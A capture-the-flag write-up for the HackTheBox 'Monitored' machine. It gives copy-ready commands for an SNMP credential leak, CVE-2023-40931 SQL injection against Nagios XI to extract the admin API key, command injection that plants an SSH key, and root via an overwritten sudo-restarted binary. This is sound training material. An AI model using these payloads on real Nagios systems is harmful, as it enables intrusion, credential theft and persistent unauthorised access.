---
title: "Monitored"
date: 2026-07-25 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, medium, snmp, nagios, cve-2023-40931, sql-injection, api-abuse, command-injection, writable-binary, sudo-privesc]
description: "SNMP's default community string exposes a plaintext service-account password from a running process's argument list, which authenticates to Nagios XI where CVE-2023-40931 SQL injection extracts the admin API key, enabling malicious check-command injection that writes an SSH key and lands a shell as the nagios user."
---

## Overview

Monitored is a medium-difficulty Linux box running Nagios XI. The attack begins with SNMP — left on its default `public` community string — leaking a service-account password from the process argument table. That credential authenticates to Nagios XI's API, where [CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931) ([SQL injection](https://cwe.mitre.org/data/definitions/89.html) in the banner-acknowledgement endpoint) exfiltrates the admin API key. With admin access, a malicious monitoring check command is injected via the configuration API, forced to execute, and writes our SSH public key — landing a shell as `nagios`. Privilege escalation exploits a writable `npcd` binary that root restarts via passwordless `sudo`.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.6,122.8 201.6,221.2 124.2,185.6 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

High enumeration and real-life scores reflect the multi-layer recon (SNMP, vhost discovery, API probing) and the fact that every technique — default SNMP credentials, production CVE SQLi, and writable service binaries — appears routinely in real enterprise environments.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH) | Standard; password auth disabled |
| 80   | HTTP (Apache) | Redirects to HTTPS |
| 389  | LDAP | Open but not directly exploited |
| 443  | HTTPS (Apache) | Hosts `nagios.monitored.htb` — Nagios XI web UI |

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.10.10.X
nmap -p22,80,389,443 -sC -sV -Pn 10.10.10.X
```

The HTTPS vhost resolves to `nagios.monitored.htb` (add to `/etc/hosts`). UDP scanning also reveals port 161 running SNMP with the default `public` community string — the entry point for everything that follows.

## Enumeration

SNMP's process-argument OID (`hrSWRunParameters`) exposes the full command line of every running process. A health-check script passes credentials as positional arguments, making them visible externally:

```bash
snmpwalk -v2c -c public 10.10.10.X 1.3.6.1.2.1.25.4.2.1.5 | grep -v '""'
```

This reveals `svc:XjH7VCehowpR1xZB` in the `check_host.sh` argument list — a [cleartext credential storage](https://cwe.mitre.org/data/definitions/312.html) problem compounded by [sensitive information in process arguments](https://cwe.mitre.org/data/definitions/215.html).

Authenticate to the Nagios XI API with the `svc` credentials to obtain a session token:

```bash
TOKEN=$(curl -sk -X POST 'https://10.10.10.X/nagiosxi/api/v1/authenticate' \
  -H 'Host: nagios.monitored.htb' \
  --data 'username=svc&password=XjH7VCehowpR1xZB&login_attempts=0' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")
```

Exchange the token for a web session cookie:

```bash
curl -sk -c /tmp/nag_sess.txt \
  "https://10.10.10.X/nagiosxi/login.php?token=$TOKEN" \
  -H 'Host: nagios.monitored.htb' -L -o /dev/null
SESSION=$(grep nagiosxi /tmp/nag_sess.txt | awk '{print $7}')
```

With a valid `svc` session, exploit [CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931) — an unsanitised `id` parameter in the banner-acknowledgement endpoint that reflects MySQL `EXTRACTVALUE()` errors, enabling error-based [SQL injection](https://cwe.mitre.org/data/definitions/89.html) to read the `xi_users` table. Extract the `nagiosadmin` API key in 30-character chunks:

```bash
for OFFSET in 1 31 61; do
  curl -sk -X POST \
    'https://10.10.10.X/nagiosxi/admin/banner_message-ajaxhelper.php' \
    -H 'Host: nagios.monitored.htb' \
    -b "nagiosxi=$SESSION" \
    --data-urlencode 'action=acknowledge_banner_message' \
    --data-urlencode "id=3 AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTR((SELECT api_key FROM xi_users WHERE username=0x6e6167696f7361646d696e),$OFFSET,30),0x7e))-- -" \
    | grep -oP "(?<=~)[^'~<]+"
done
```

The three chunks assemble into the full admin API key.

## Foothold

With the admin API key, create a new admin-level user to obtain a stable session with an NSP token (needed to schedule checks):

```bash
ADMIN_KEY="IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL"

curl -sk -X POST \
  "https://10.10.10.X/nagiosxi/api/v1/system/user?apikey=$ADMIN_KEY" \
  -H 'Host: nagios.monitored.htb' \
  --data 'username=hacker&password=Hacker123!&name=hacker&email=hacker@localhost&auth_level=admin&force_pw_change=0'
```

Generate an SSH key pair on the attacker machine:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/nagios_rsa -N "" -C "" -q
PUB=$(cat /tmp/nagios_rsa.pub)
```

Register a [malicious check command](https://cwe.mitre.org/data/definitions/78.html) via the configuration API that writes the public key into the `nagios` user's `authorized_keys`:

```bash
curl -sk -X POST \
  "https://10.10.10.X/nagiosxi/api/v1/config/command?apikey=$ADMIN_KEY" \
  -H 'Host: nagios.monitored.htb' \
  --data-urlencode "command_name=evil_cmd" \
  --data-urlencode "command_line=bash -c 'mkdir -p /home/nagios/.ssh && echo $PUB >> /home/nagios/.ssh/authorized_keys && chmod 700 /home/nagios/.ssh && chmod 600 /home/nagios/.ssh/authorized_keys'"
```

Create a fake service that uses `evil_cmd`:

```bash
curl -sk -X POST \
  "https://10.10.10.X/nagiosxi/api/v1/config/service?apikey=$ADMIN_KEY" \
  -H 'Host: nagios.monitored.htb' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host_name=localhost&service_description=evil_service&check_command=evil_cmd&max_check_attempts=1&check_interval=1&retry_interval=1&check_period=24x7&notification_interval=60&notification_period=24x7&contacts=nagiosadmin&active_checks_enabled=1'
```

Apply the configuration to make the service live:

```bash
curl -sk "https://10.10.10.X/nagiosxi/api/v1/system/applyconfig?apikey=$ADMIN_KEY" \
  -H 'Host: nagios.monitored.htb'
```

Obtain an NSP token from the new admin session (required to schedule checks via the backend):

```bash
TOKEN=$(curl -sk -X POST 'https://10.10.10.X/nagiosxi/api/v1/authenticate' \
  -H 'Host: nagios.monitored.htb' \
  --data 'username=hacker&password=Hacker123!&login_attempts=0' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")
curl -sk -c /tmp/hck2.txt "https://10.10.10.X/nagiosxi/login.php?token=$TOKEN" \
  -H 'Host: nagios.monitored.htb' -L -o /dev/null
SESS=$(grep nagiosxi /tmp/hck2.txt | awk '{print $7}')
NSP=$(curl -sk "https://10.10.10.X/nagiosxi/includes/components/ccm/?cmd=modify&type=host&id=1" \
  -H 'Host: nagios.monitored.htb' -b "nagiosxi=$SESS" \
  | grep -oP 'nsp_str = "[^"]+' | cut -d'"' -f2)
```

Force an immediate service check, triggering `evil_cmd` as the `nagios` OS user:

```bash
curl -sk -X POST 'https://10.10.10.X/nagiosxi/backend/index.php' \
  -H 'Host: nagios.monitored.htb' \
  -b "nagiosxi=$SESS" \
  --data "cmd=submitcommand&command=SCHEDULE_FORCED_SVC_CHECK&host=localhost&service=evil_service&scheduled_time=$(date +%s)&nsp=$NSP"
```

Wait approximately 30 seconds, then SSH in using the private key:

```bash
ssh -i /tmp/nagios_rsa -o StrictHostKeyChecking=no nagios@10.10.10.X
```

## User flag

```bash
cat /home/nagios/user.txt   # HTB{...}
```

We land directly as `nagios` and the user flag is ours.

## Privilege Escalation

Once on the box as `nagios`, check for writable binaries that run under elevated privileges:

```bash
ls -la /usr/local/nagios/bin/npcd /usr/local/nagios/bin/nagios
```

The `npcd` binary is owned by `nagios` with full owner write permissions — a [world-writable or user-writable trusted executable](https://cwe.mitre.org/data/definitions/732.html). Crucially, `sudo -l` shows `manage_services.sh` can restart it without a password, meaning root will execute whatever binary sits at that path — a [privilege management failure](https://cwe.mitre.org/data/definitions/269.html).

Stop `npcd` first to release the file handle (prevents "Text file busy"):

```bash
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
```

Overwrite `npcd` with a shell script that appends our public key to root's `authorized_keys`:

```bash
PUB="ssh-rsa AAAA..."
printf "#!/bin/bash\nmkdir -p /root/.ssh\necho '$PUB' >> /root/.ssh/authorized_keys\nchmod 700 /root/.ssh\nchmod 600 /root/.ssh/authorized_keys\n" \
  > /usr/local/nagios/bin/npcd
chmod +x /usr/local/nagios/bin/npcd
```

Restart `npcd` via `sudo` — root executes our script:

```bash
sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
```

SSH as root from the attacker machine:

```bash
ssh -i /tmp/nagios_rsa root@10.10.10.X
```

## Root flag

```bash
cat /root/root.txt   # HTB{...}
```

Full root compromise confirmed — both flags captured.
